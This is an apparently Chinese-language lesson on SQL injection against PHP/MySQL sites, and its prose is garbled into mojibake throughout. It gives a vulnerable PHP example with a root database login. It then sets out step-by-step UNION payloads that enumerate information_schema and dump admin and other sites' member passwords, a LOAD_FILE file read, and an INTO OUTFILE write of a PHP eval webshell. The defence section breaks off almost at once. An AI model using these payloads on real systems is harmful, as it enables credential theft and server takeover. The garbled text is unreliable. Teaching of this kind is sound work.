# ç¬¬42è¯¾ï¼šPHPåº”ç”¨ä¸MySQLæ¶æ„ã€SQLæ³¨å…¥ã€è·¨åº“æŸ¥è¯¢ã€æ–‡ä»¶è¯»å†™ä¸æƒé™æ“ä½œ ğŸ”

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ PHPåº”ç”¨ä¸MySQLæ•°æ®åº“æ¶æ„çš„åŸºç¡€çŸ¥è¯†ï¼Œå¹¶æ·±å…¥æ¢è®¨SQLæ³¨å…¥æ¼æ´çš„åŸç†ã€åˆ©ç”¨æ–¹å¼åŠå…¶é«˜çº§æ“ä½œï¼ŒåŒ…æ‹¬è·¨åº“æŸ¥è¯¢ã€æ–‡ä»¶è¯»å†™å’Œæƒé™æ“ä½œã€‚é€šè¿‡ç†è§£è¿™äº›æ ¸å¿ƒæ¦‚å¿µï¼Œä½ å°†èƒ½å¤Ÿæ›´å¥½åœ°è¯†åˆ«å’Œåˆ©ç”¨SQLæ³¨å…¥æ¼æ´ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_1.png)

![](img/405616e6279047f0a8b81af09c2a96bc_3.png)

![](img/405616e6279047f0a8b81af09c2a96bc_4.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_6.png)

![](img/405616e6279047f0a8b81af09c2a96bc_8.png)

![](img/405616e6279047f0a8b81af09c2a96bc_10.png)

## æ¦‚è¿° ğŸ“‹

æœ¬èŠ‚è¯¾å°†é¦–å…ˆä»‹ç»PHPä¸MySQLçš„å¸¸è§æ¶æ„æ¨¡å¼ï¼Œç„¶åè¯¦ç»†è®²è§£SQLæ³¨å…¥æ¼æ´çš„äº§ç”ŸåŸç†ã€‚æˆ‘ä»¬å°†é€šè¿‡å®é™…ä»£ç æ¼”ç¤ºï¼Œå±•ç¤ºå¦‚ä½•åˆ©ç”¨SQLæ³¨å…¥è¿›è¡Œæ•°æ®çªƒå–ã€è·¨åº“æŸ¥è¯¢ä»¥åŠæ–‡ä»¶è¯»å†™æ“ä½œã€‚æœ€åï¼Œæˆ‘ä»¬ä¼šè®¨è®ºæƒé™å¯¹æ³¨å…¥åˆ©ç”¨çš„å½±å“ï¼Œå¹¶æ€»ç»“é˜²å¾¡æªæ–½ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_12.png)

![](img/405616e6279047f0a8b81af09c2a96bc_14.png)

---

## PHPä¸MySQLæ¶æ„æ¨¡å¼ ğŸ—ï¸

åœ¨å¼€å§‹å­¦ä¹ SQLæ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£PHPåº”ç”¨ä¸MySQLæ•°æ®åº“çš„ä¸¤ç§å¸¸è§æ¶æ„æ¨¡å¼ã€‚è¿™ä¸¤ç§æ¨¡å¼å†³å®šäº†æ•°æ®åº“ç”¨æˆ·æƒé™çš„åˆ†é…æ–¹å¼ï¼Œç›´æ¥å½±å“SQLæ³¨å…¥æ”»å‡»çš„æ½œåœ¨å½±å“èŒƒå›´ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_16.png)

![](img/405616e6279047f0a8b81af09c2a96bc_18.png)

### ç»Ÿä¸€ç®¡ç†æ¶æ„ï¼ˆRootç”¨æˆ·æ¨¡å¼ï¼‰

![](img/405616e6279047f0a8b81af09c2a96bc_20.png)

![](img/405616e6279047f0a8b81af09c2a96bc_22.png)

åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œæ‰€æœ‰ç½‘ç«™å…±äº«åŒä¸€ä¸ªMySQLçš„`root`ç”¨æˆ·ï¼ˆæˆ–å…·æœ‰é«˜æƒé™çš„ç®¡ç†å‘˜ç”¨æˆ·ï¼‰æ¥ç®¡ç†å„è‡ªçš„æ•°æ®åº“ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_24.png)

![](img/405616e6279047f0a8b81af09c2a96bc_26.png)

![](img/405616e6279047f0a8b81af09c2a96bc_28.png)

![](img/405616e6279047f0a8b81af09c2a96bc_30.png)

![](img/405616e6279047f0a8b81af09c2a96bc_32.png)

**æ¶æ„æ¨¡å‹ï¼š**
```
MySQL æ•°æ®åº“
â”œâ”€â”€ root ç”¨æˆ· (æœ€é«˜æƒé™)
â”‚   â”œâ”€â”€ ç½‘ç«™Aæ•°æ®åº“ (ä¾‹å¦‚ï¼šzblog)
â”‚   â””â”€â”€ ç½‘ç«™Bæ•°æ®åº“ (ä¾‹å¦‚ï¼šdemo01)
```

![](img/405616e6279047f0a8b81af09c2a96bc_34.png)

**ç‰¹ç‚¹ï¼š**
*   ä¸€ä¸ªé«˜æƒé™ç”¨æˆ·ç®¡ç†æ‰€æœ‰æ•°æ®åº“ã€‚
*   å¦‚æœä¸€ä¸ªç½‘ç«™å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯èƒ½åˆ©ç”¨è¯¥æ¼æ´è®¿é—®å’Œæ“ä½œåŒä¸€MySQLå®ä¾‹ä¸‹çš„å…¶ä»–ç½‘ç«™æ•°æ®åº“ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_36.png)

![](img/405616e6279047f0a8b81af09c2a96bc_38.png)

![](img/405616e6279047f0a8b81af09c2a96bc_40.png)

![](img/405616e6279047f0a8b81af09c2a96bc_42.png)

### ç‹¬ç«‹ç®¡ç†æ¶æ„ï¼ˆç‹¬ç«‹ç”¨æˆ·æ¨¡å¼ï¼‰

![](img/405616e6279047f0a8b81af09c2a96bc_44.png)

åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œæ¯ä¸ªç½‘ç«™ä½¿ç”¨ç‹¬ç«‹çš„ã€æƒé™å—é™çš„MySQLç”¨æˆ·æ¥ç®¡ç†è‡ªå·±çš„æ•°æ®åº“ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_46.png)

![](img/405616e6279047f0a8b81af09c2a96bc_48.png)

![](img/405616e6279047f0a8b81af09c2a96bc_50.png)

![](img/405616e6279047f0a8b81af09c2a96bc_52.png)

**æ¶æ„æ¨¡å‹ï¼š**
```
MySQL æ•°æ®åº“
â”œâ”€â”€ ç½‘ç«™Aç”¨æˆ· (ä¾‹å¦‚ï¼šuser_a)
â”‚   â””â”€â”€ ç½‘ç«™Aæ•°æ®åº“
â””â”€â”€ ç½‘ç«™Bç”¨æˆ· (ä¾‹å¦‚ï¼šuser_b)
    â””â”€â”€ ç½‘ç«™Bæ•°æ®åº“
```

![](img/405616e6279047f0a8b81af09c2a96bc_54.png)

![](img/405616e6279047f0a8b81af09c2a96bc_56.png)

![](img/405616e6279047f0a8b81af09c2a96bc_58.png)

**ç‰¹ç‚¹ï¼š**
*   æ¯ä¸ªæ•°æ®åº“ç”±ä¸“å±çš„ä½æƒé™ç”¨æˆ·ç®¡ç†ã€‚
*   ç”¨æˆ·é€šå¸¸åªèƒ½è®¿é—®è‡ªå·±åä¸‹çš„æ•°æ®åº“ã€‚
*   å³ä½¿ä¸€ä¸ªç½‘ç«™å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ”»å‡»è€…ä¹Ÿéš¾ä»¥è·¨åº“è®¿é—®å…¶ä»–ç½‘ç«™çš„æ•°æ®ï¼Œå®‰å…¨æ€§ç›¸å¯¹æ›´é«˜ã€‚

**ç†è§£è¿™ä¸¤ç§æ¶æ„å¯¹äºåç»­åˆ†ææ³¨å…¥ç‚¹çš„å±å®³å’Œåˆ¶å®šæ”»å‡»ç­–ç•¥è‡³å…³é‡è¦ã€‚**

![](img/405616e6279047f0a8b81af09c2a96bc_60.png)

![](img/405616e6279047f0a8b81af09c2a96bc_62.png)

![](img/405616e6279047f0a8b81af09c2a96bc_64.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_66.png)

![](img/405616e6279047f0a8b81af09c2a96bc_68.png)

![](img/405616e6279047f0a8b81af09c2a96bc_70.png)

## SQLæ³¨å…¥åŸç†ä¸åŸºç¡€åˆ©ç”¨ ğŸ¯

![](img/405616e6279047f0a8b81af09c2a96bc_72.png)

![](img/405616e6279047f0a8b81af09c2a96bc_74.png)

![](img/405616e6279047f0a8b81af09c2a96bc_76.png)

![](img/405616e6279047f0a8b81af09c2a96bc_78.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†æ•°æ®åº“çš„æ¶æ„æ¨¡å¼ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹SQLæ³¨å…¥æ¼æ´çš„æ ¸å¿ƒåŸç†ã€‚SQLæ³¨å…¥çš„æœ¬è´¨æ˜¯ï¼šåº”ç”¨ç¨‹åºå°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œæœªç»å……åˆ†è¿‡æ»¤æˆ–è½¬ä¹‰ï¼Œç›´æ¥æ‹¼æ¥åˆ°äº†SQLæŸ¥è¯¢è¯­å¥ä¸­å¹¶æ‰§è¡Œã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_80.png)

### æ¼æ´ä»£ç ç¤ºä¾‹

![](img/405616e6279047f0a8b81af09c2a96bc_82.png)

å‡è®¾æˆ‘ä»¬æœ‰ä»¥ä¸‹ç®€å•çš„PHPä»£ç ï¼ˆ`64.php`ï¼‰ï¼š

![](img/405616e6279047f0a8b81af09c2a96bc_84.png)

```php
<?php
include 'config.php'; // åŒ…å«æ•°æ®åº“é…ç½®æ–‡ä»¶
$id = $_GET['id'] ?? 1; // è·å–ç”¨æˆ·è¾“å…¥çš„idå‚æ•°ï¼Œé»˜è®¤ä¸º1
$sql = "SELECT * FROM news WHERE id = $id"; // å°†ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°SQLè¯­å¥
$result = mysqli_query($conn, $sql);
// ... è¾“å‡ºæŸ¥è¯¢ç»“æœ ...
?>
```

![](img/405616e6279047f0a8b81af09c2a96bc_86.png)

**æ•°æ®åº“é…ç½®æ–‡ä»¶ (`config.php`) å¯èƒ½å¦‚ä¸‹ï¼š**
```php
<?php
$conn = mysqli_connect('localhost', 'root', '123456', 'demo01');
?>
```

![](img/405616e6279047f0a8b81af09c2a96bc_88.png)

![](img/405616e6279047f0a8b81af09c2a96bc_90.png)

### æ­£å¸¸è®¿é—®ä¸æ”»å‡»æ¼”ç¤º

1.  **æ­£å¸¸è®¿é—®ï¼š** å½“ç”¨æˆ·è®¿é—® `http://site.com/64.php?id=1` æ—¶ï¼Œæ‰§è¡Œçš„SQLè¯­å¥æ˜¯ï¼š
    ```sql
    SELECT * FROM news WHERE id = 1
    ```
    è¿™ä¼šè¿”å›`news`è¡¨ä¸­`id`ä¸º1çš„æ–‡ç« ã€‚

2.  **æ³¨å…¥æ”»å‡»ï¼š** å½“æ”»å‡»è€…è®¿é—® `http://site.com/64.php?id=-1 UNION SELECT 1,2,3,username,password,6 FROM admin` æ—¶ï¼Œæ‰§è¡Œçš„SQLè¯­å¥å˜ä¸ºï¼š
    ```sql
    SELECT * FROM news WHERE id = -1 UNION SELECT 1,2,3,username,password,6 FROM admin
    ```
    ç”±äº`id=-1`é€šå¸¸ä¸å­˜åœ¨ï¼ŒåŸæŸ¥è¯¢ç»“æœä¸ºç©ºã€‚`UNION`æ“ä½œä¼šæ‰§è¡ŒååŠæ®µæŸ¥è¯¢ï¼Œä»è€Œå°†`admin`è¡¨ä¸­çš„ç”¨æˆ·åå’Œå¯†ç æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_92.png)

![](img/405616e6279047f0a8b81af09c2a96bc_94.png)

![](img/405616e6279047f0a8b81af09c2a96bc_96.png)

![](img/405616e6279047f0a8b81af09c2a96bc_98.png)

**æ ¸å¿ƒå…¬å¼ï¼š**
```
æ¶æ„ç”¨æˆ·è¾“å…¥ + æœªè¿‡æ»¤çš„SQLæ‹¼æ¥ = å¯è¢«æ“æ§çš„SQLè¯­å¥æ‰§è¡Œ
```

![](img/405616e6279047f0a8b81af09c2a96bc_100.png)

**æ”»å‡»è€…çš„æ€è·¯æ˜¯ï¼šSQLè¯­å¥èƒ½æ‰§è¡Œä»€ä¹ˆæ“ä½œï¼Œæ³¨å…¥æ”»å‡»å°±èƒ½å®ç°ä»€ä¹ˆç›®çš„ã€‚è€ŒSQLè¯­å¥çš„åŠŸèƒ½ç”±æ•°æ®åº“ç±»å‹ï¼ˆå¦‚MySQLã€Oracleï¼‰å†³å®šã€‚**

---

![](img/405616e6279047f0a8b81af09c2a96bc_102.png)

![](img/405616e6279047f0a8b81af09c2a96bc_104.png)

![](img/405616e6279047f0a8b81af09c2a96bc_106.png)

## MySQLä¿¡æ¯æ”¶é›†ä¸æ•°æ®è·å– ğŸ“Š

![](img/405616e6279047f0a8b81af09c2a96bc_108.png)

![](img/405616e6279047f0a8b81af09c2a96bc_109.png)

![](img/405616e6279047f0a8b81af09c2a96bc_111.png)

åœ¨ä¸Šä¸€èŠ‚æˆ‘ä»¬çœ‹åˆ°äº†åŸºç¡€çš„æ³¨å…¥åˆ©ç”¨ï¼Œä½†åœ¨å®æˆ˜ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä¸çŸ¥é“æ•°æ®åº“çš„è¡¨åå’Œåˆ—åã€‚æœ¬èŠ‚å°†ä»‹ç»å¦‚ä½•åˆ©ç”¨MySQLçš„å†…ç½®ç³»ç»Ÿæ•°æ®åº“`information_schema`æ¥è·å–è¿™äº›ä¿¡æ¯ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_113.png)

### å…³é”®ä¿¡æ¯æ”¶é›†

![](img/405616e6279047f0a8b81af09c2a96bc_115.png)

åœ¨å¼€å§‹æ³¨å…¥å‰ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦æ”¶é›†ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼š
*   **æ•°æ®åº“ç‰ˆæœ¬ï¼š** `version()` - åˆ¤æ–­æ˜¯å¦æ”¯æŒ`information_schema`ï¼ˆé€šå¸¸éœ€>5.0ï¼‰ã€‚
*   **å½“å‰ç”¨æˆ·ï¼š** `user()` - åˆ¤æ–­æ˜¯å¦ä¸ºé«˜æƒé™ç”¨æˆ·ï¼ˆå¦‚`root`ï¼‰ï¼Œè¿™å…³ç³»åˆ°èƒ½å¦è¿›è¡Œè·¨åº“æŸ¥è¯¢å’Œæ–‡ä»¶è¯»å†™ã€‚
*   **å½“å‰æ•°æ®åº“åï¼š** `database()`ã€‚
*   **æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼š** `@@version_compile_os` - å½±å“è·¯å¾„å¤§å°å†™ï¼ˆLinuxæ•æ„Ÿï¼ŒWindowsä¸æ•æ„Ÿï¼‰ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_117.png)

![](img/405616e6279047f0a8b81af09c2a96bc_119.png)

![](img/405616e6279047f0a8b81af09c2a96bc_120.png)

![](img/405616e6279047f0a8b81af09c2a96bc_122.png)

![](img/405616e6279047f0a8b81af09c2a96bc_124.png)

**ç¤ºä¾‹æ³¨å…¥è¯­å¥ï¼š**
```sql
?id=-1 UNION SELECT 1,version(),database(),user(),@@version_compile_os,6
```

![](img/405616e6279047f0a8b81af09c2a96bc_126.png)

![](img/405616e6279047f0a8b81af09c2a96bc_128.png)

![](img/405616e6279047f0a8b81af09c2a96bc_130.png)

![](img/405616e6279047f0a8b81af09c2a96bc_132.png)

### åˆ©ç”¨ `information_schema` è·å–æ•°æ®ç»“æ„

![](img/405616e6279047f0a8b81af09c2a96bc_134.png)

`information_schema` æ˜¯MySQLè‡ªå¸¦çš„ä¿¡æ¯æ•°æ®åº“ï¼Œå­˜å‚¨äº†å…³äºæ‰€æœ‰æ•°æ®åº“ã€è¡¨ã€åˆ—ç­‰å…ƒæ•°æ®ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_136.png)

![](img/405616e6279047f0a8b81af09c2a96bc_138.png)

![](img/405616e6279047f0a8b81af09c2a96bc_140.png)

ä»¥ä¸‹æ˜¯è·å–æ•°æ®çš„æ ‡å‡†æ­¥éª¤ï¼š

1.  **è·å–æ‰€æœ‰æ•°æ®åº“åï¼š**
    ```sql
    UNION SELECT 1,2,3,4,group_concat(schema_name),6 FROM information_schema.schemata
    ```
    *   `information_schema.schemata` è¡¨å­˜å‚¨æ‰€æœ‰æ•°æ®åº“åã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_142.png)

![](img/405616e6279047f0a8b81af09c2a96bc_144.png)

2.  **è·å–æŒ‡å®šæ•°æ®åº“ï¼ˆå¦‚`demo01`ï¼‰ä¸‹çš„æ‰€æœ‰è¡¨åï¼š**
    ```sql
    UNION SELECT 1,2,3,4,group_concat(table_name),6 FROM information_schema.tables WHERE table_schema='demo01'
    ```
    *   `information_schema.tables` è¡¨å­˜å‚¨æ‰€æœ‰è¡¨çš„ä¿¡æ¯ã€‚
    *   `table_schema` å­—æ®µæŒ‡å®šæ•°æ®åº“åã€‚

3.  **è·å–æŒ‡å®šè¡¨ï¼ˆå¦‚`admin`ï¼‰ä¸‹çš„æ‰€æœ‰åˆ—åï¼š**
    ```sql
    UNION SELECT 1,2,3,4,group_concat(column_name),6 FROM information_schema.columns WHERE table_schema='demo01' AND table_name='admin'
    ```
    *   `information_schema.columns` è¡¨å­˜å‚¨æ‰€æœ‰åˆ—çš„ä¿¡æ¯ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_146.png)

![](img/405616e6279047f0a8b81af09c2a96bc_148.png)

4.  **æœ€ç»ˆè·å–æ•°æ®ï¼š**
    ```sql
    UNION SELECT 1,2,3,username,password,6 FROM admin
    ```

![](img/405616e6279047f0a8b81af09c2a96bc_150.png)

**é€šè¿‡è¿™å¥—æµç¨‹ï¼Œæ”»å‡»è€…å¯ä»¥ç³»ç»Ÿåœ°ä»ä¸€ä¸ªæœªçŸ¥ç»“æ„çš„æ•°æ®åº“ä¸­æå–å‡ºæ•æ„Ÿæ•°æ®ï¼Œè€Œæ— éœ€ä¾èµ–çŒœæµ‹ã€‚**

![](img/405616e6279047f0a8b81af09c2a96bc_152.png)

![](img/405616e6279047f0a8b81af09c2a96bc_154.png)

![](img/405616e6279047f0a8b81af09c2a96bc_156.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_158.png)

![](img/405616e6279047f0a8b81af09c2a96bc_160.png)

![](img/405616e6279047f0a8b81af09c2a96bc_162.png)

![](img/405616e6279047f0a8b81af09c2a96bc_164.png)

## è·¨åº“æŸ¥è¯¢ ğŸŒ‰

![](img/405616e6279047f0a8b81af09c2a96bc_166.png)

![](img/405616e6279047f0a8b81af09c2a96bc_168.png)

å›é¡¾æˆ‘ä»¬æœ€åˆè®²çš„æ¶æ„æ¨¡å¼ï¼Œå¦‚æœæ³¨å…¥ç‚¹ä½¿ç”¨çš„æ˜¯é«˜æƒé™æ•°æ®åº“ç”¨æˆ·ï¼ˆå¦‚`root`ï¼‰ï¼Œæ”»å‡»è€…å°±å¯ä»¥è¿›è¡Œè·¨åº“æŸ¥è¯¢ã€‚è¿™æ„å‘³ç€ï¼Œé€šè¿‡ä¸€ä¸ªç½‘ç«™çš„æ³¨å…¥ç‚¹ï¼Œå¯ä»¥çªƒå–åŒä¸€MySQLæœåŠ¡å™¨ä¸Šå…¶ä»–ç½‘ç«™æ•°æ®åº“çš„æ•°æ®ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_170.png)

![](img/405616e6279047f0a8b81af09c2a96bc_172.png)

![](img/405616e6279047f0a8b81af09c2a96bc_174.png)

![](img/405616e6279047f0a8b81af09c2a96bc_176.png)

### è·¨åº“æŸ¥è¯¢æ¡ä»¶

![](img/405616e6279047f0a8b81af09c2a96bc_178.png)

![](img/405616e6279047f0a8b81af09c2a96bc_180.png)

![](img/405616e6279047f0a8b81af09c2a96bc_182.png)

![](img/405616e6279047f0a8b81af09c2a96bc_184.png)

![](img/405616e6279047f0a8b81af09c2a96bc_186.png)

![](img/405616e6279047f0a8b81af09c2a96bc_188.png)

1.  æ³¨å…¥ç‚¹å½“å‰æ•°æ®åº“è¿æ¥ç”¨æˆ·ä¸ºé«˜æƒé™ç”¨æˆ·ï¼ˆå¦‚`root`ï¼‰ã€‚
2.  çŸ¥é“æˆ–èƒ½çŒœå‡ºç›®æ ‡æ•°æ®åº“çš„åå­—ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_190.png)

![](img/405616e6279047f0a8b81af09c2a96bc_192.png)

![](img/405616e6279047f0a8b81af09c2a96bc_194.png)

### æ”»å‡»æ¼”ç¤º

![](img/405616e6279047f0a8b81af09c2a96bc_196.png)

![](img/405616e6279047f0a8b81af09c2a96bc_198.png)

å‡è®¾æˆ‘ä»¬é€šè¿‡æ³¨å…¥ç‚¹å‘ç°å½“å‰ç”¨æˆ·æ˜¯`root`ï¼Œå¹¶ä¸”é€šè¿‡æŸ¥è¯¢`information_schema.schemata`å¾—åˆ°äº†ä¸€ä¸ªç–‘ä¼¼å…¶ä»–ç½‘ç«™çš„æ•°æ®åº“å`zblog`ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_200.png)

![](img/405616e6279047f0a8b81af09c2a96bc_202.png)

æ”»å‡»æ­¥éª¤å¦‚ä¸‹ï¼š

![](img/405616e6279047f0a8b81af09c2a96bc_204.png)

![](img/405616e6279047f0a8b81af09c2a96bc_206.png)

![](img/405616e6279047f0a8b81af09c2a96bc_208.png)

1.  **æŸ¥è¯¢`zblog`æ•°æ®åº“ä¸‹çš„è¡¨åï¼š**
    ```sql
    UNION SELECT 1,2,3,4,group_concat(table_name),6 FROM information_schema.tables WHERE table_schema='zblog'
    ```

![](img/405616e6279047f0a8b81af09c2a96bc_210.png)

2.  **å‡è®¾å‘ç°`zbp_member`è¡¨ï¼ŒæŸ¥è¯¢å…¶åˆ—åï¼š**
    ```sql
    UNION SELECT 1,2,3,4,group_concat(column_name),6 FROM information_schema.columns WHERE table_schema='zblog' AND table_name='zbp_member'
    ```

![](img/405616e6279047f0a8b81af09c2a96bc_212.png)

![](img/405616e6279047f0a8b81af09c2a96bc_214.png)

![](img/405616e6279047f0a8b81af09c2a96bc_216.png)

![](img/405616e6279047f0a8b81af09c2a96bc_218.png)

3.  **æœ€ç»ˆè·¨åº“æŸ¥è¯¢ç”¨æˆ·æ•°æ®ï¼š**
    ```sql
    UNION SELECT 1,2,3,mem_Name,mem_Password,6 FROM zblog.zbp_member
    ```
    **æ³¨æ„ï¼š** è¿™é‡Œä½¿ç”¨äº† `zblog.zbp_member` æ¥æ˜ç¡®æŒ‡å®šæ•°æ®åº“å’Œè¡¨ï¼Œè¿™æ˜¯è·¨åº“æŸ¥è¯¢çš„å…³é”®è¯­æ³•ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_220.png)

![](img/405616e6279047f0a8b81af09c2a96bc_222.png)

![](img/405616e6279047f0a8b81af09c2a96bc_224.png)

**å¦‚æœæ•°æ®åº“è¿æ¥ç”¨æˆ·æ˜¯æ™®é€šç”¨æˆ·ï¼ˆå¦‚`demo01`ï¼‰ï¼Œåˆ™åªèƒ½è®¿é—®`demo01`æ•°æ®åº“ï¼Œæ— æ³•è¿›è¡Œè·¨åº“æŸ¥è¯¢ã€‚è¿™ä½“ç°äº†ç‹¬ç«‹ç”¨æˆ·æ¶æ„çš„å®‰å…¨æ€§ä¼˜åŠ¿ã€‚**

![](img/405616e6279047f0a8b81af09c2a96bc_226.png)

![](img/405616e6279047f0a8b81af09c2a96bc_228.png)

![](img/405616e6279047f0a8b81af09c2a96bc_230.png)

![](img/405616e6279047f0a8b81af09c2a96bc_232.png)

![](img/405616e6279047f0a8b81af09c2a96bc_234.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_236.png)

## æ–‡ä»¶è¯»å†™æ“ä½œ ğŸ“

![](img/405616e6279047f0a8b81af09c2a96bc_238.png)

![](img/405616e6279047f0a8b81af09c2a96bc_240.png)

![](img/405616e6279047f0a8b81af09c2a96bc_242.png)

![](img/405616e6279047f0a8b81af09c2a96bc_244.png)

![](img/405616e6279047f0a8b81af09c2a96bc_246.png)

æŸäº›é«˜æƒé™çš„SQLæ³¨å…¥ç‚¹è¿˜å…è®¸è¿›è¡Œæ–‡ä»¶è¯»å†™æ“ä½œï¼Œè¿™å¯èƒ½å¯¼è‡´æ›´ä¸¥é‡çš„åæœï¼Œå¦‚ç›´æ¥è·å–Webshellã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_248.png)

### æ–‡ä»¶è¯»å†™æ¡ä»¶

![](img/405616e6279047f0a8b81af09c2a96bc_250.png)

![](img/405616e6279047f0a8b81af09c2a96bc_252.png)

![](img/405616e6279047f0a8b81af09c2a96bc_254.png)

![](img/405616e6279047f0a8b81af09c2a96bc_256.png)

![](img/405616e6279047f0a8b81af09c2a96bc_258.png)

1.  **æ•°æ®åº“ç”¨æˆ·æƒé™é«˜ï¼š** é€šå¸¸æ˜¯`root`æˆ–å…·æœ‰`FILE`æƒé™çš„ç”¨æˆ·ã€‚
2.  **MySQLé…ç½®å…è®¸ï¼š** `secure_file_priv` ç³»ç»Ÿå˜é‡ä¸èƒ½è®¾ç½®ä¸º`NULL`ï¼ˆå®Œå…¨ç¦æ­¢ï¼‰æˆ–ç‰¹å®šç›®å½•å¤–çš„è·¯å¾„ã€‚ç©ºå€¼æˆ–ç‰¹å®šç›®å½•åˆ™å…è®¸å¯¹åº”æ“ä½œã€‚
3.  **çŸ¥é“æœåŠ¡å™¨ä¸Šçš„ç»å¯¹è·¯å¾„ï¼š** è¿™æ˜¯å†™å…¥Webshellçš„å…³é”®ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_260.png)

![](img/405616e6279047f0a8b81af09c2a96bc_262.png)

![](img/405616e6279047f0a8b81af09c2a96bc_264.png)

![](img/405616e6279047f0a8b81af09c2a96bc_266.png)

### ç›¸å…³SQLå‡½æ•°

![](img/405616e6279047f0a8b81af09c2a96bc_268.png)

![](img/405616e6279047f0a8b81af09c2a96bc_270.png)

![](img/405616e6279047f0a8b81af09c2a96bc_272.png)

*   **è¯»å–æ–‡ä»¶ï¼š** `LOAD_FILE(â€˜æ–‡ä»¶è·¯å¾„â€™)`
    ```sql
    UNION SELECT 1,2,3,4,LOAD_FILE(â€˜D:/www/site/config.phpâ€™),6
    ```
*   **å†™å…¥æ–‡ä»¶ï¼š** `INTO OUTFILE` / `INTO DUMPFILE`
    ```sql
    UNION SELECT 1,2,3,4,â€˜<?php @eval($_POST[cmd]);?>â€˜,6 INTO OUTFILE â€˜D:/www/site/shell.phpâ€™
    ```

![](img/405616e6279047f0a8b81af09c2a96bc_274.png)

![](img/405616e6279047f0a8b81af09c2a96bc_276.png)

![](img/405616e6279047f0a8b81af09c2a96bc_278.png)

### å¦‚ä½•è·å–ç½‘ç«™è·¯å¾„ï¼Ÿ

![](img/405616e6279047f0a8b81af09c2a96bc_280.png)

![](img/405616e6279047f0a8b81af09c2a96bc_282.png)

*   **æŠ¥é”™ä¿¡æ¯ï¼š** ç½‘ç«™å¼€å¯é”™è¯¯æ˜¾ç¤ºæ—¶ï¼Œå¯èƒ½æš´éœ²ç‰©ç†è·¯å¾„ã€‚
*   **PHPæ¢é’ˆï¼š** å¦‚`phpinfo()`é¡µé¢ã€‚
*   **è¯»å–é…ç½®æ–‡ä»¶ï¼š** å¦‚Apacheçš„`httpd.conf`æˆ–ç½‘ç«™çš„æ•°æ®åº“é…ç½®æ–‡ä»¶ã€‚
*   **å¸¸è§é»˜è®¤è·¯å¾„çŒœæµ‹ï¼š** æ ¹æ®ä¸­é—´ä»¶ï¼ˆå¦‚Apacheã€Nginxï¼‰å’Œæ“ä½œç³»ç»Ÿçš„å¸¸è§å®‰è£…è·¯å¾„è¿›è¡Œå°è¯•ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_284.png)

![](img/405616e6279047f0a8b81af09c2a96bc_286.png)

![](img/405616e6279047f0a8b81af09c2a96bc_288.png)

![](img/405616e6279047f0a8b81af09c2a96bc_290.png)

![](img/405616e6279047f0a8b81af09c2a96bc_292.png)

![](img/405616e6279047f0a8b81af09c2a96bc_294.png)

**æ–‡ä»¶è¯»å†™æ˜¯SQLæ³¨å…¥çš„é«˜å±åˆ©ç”¨æ–¹å¼ï¼Œä¸€æ—¦æˆåŠŸï¼Œæ”»å‡»è€…å‡ ä¹å¯ä»¥å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚ä½†ç°ä»£MySQLç‰ˆæœ¬ï¼ˆå¦‚8.0+ï¼‰é»˜è®¤çš„`secure_file_priv`è®¾ç½®å’Œç‹¬ç«‹ç”¨æˆ·æ¶æ„æå¤§åœ°é™ä½äº†æ­¤ç±»é£é™©ã€‚**

![](img/405616e6279047f0a8b81af09c2a96bc_296.png)

![](img/405616e6279047f0a8b81af09c2a96bc_298.png)

![](img/405616e6279047f0a8b81af09c2a96bc_300.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_302.png)

![](img/405616e6279047f0a8b81af09c2a96bc_304.png)

![](img/405616e6279047f0a8b81af09c2a96bc_306.png)

![](img/405616e6279047f0a8b81af09c2a96bc_308.png)

![](img/405616e6279047f0a8b81af09c2a96bc_310.png)

## æƒé™ä¸é˜²å¾¡æ€»ç»“ ğŸ›¡ï¸

æœ¬èŠ‚è¯¾æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†SQLæ³¨å…¥ä»åŸç†åˆ°é«˜çº§åˆ©ç”¨çš„å…¨è¿‡ç¨‹ã€‚æˆ‘ä»¬æ¥æ€»ç»“ä¸€ä¸‹æƒé™çš„æ ¸å¿ƒä½œç”¨ä»¥åŠåŸºæœ¬çš„é˜²å¾¡æ€è·¯ã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_312.png)

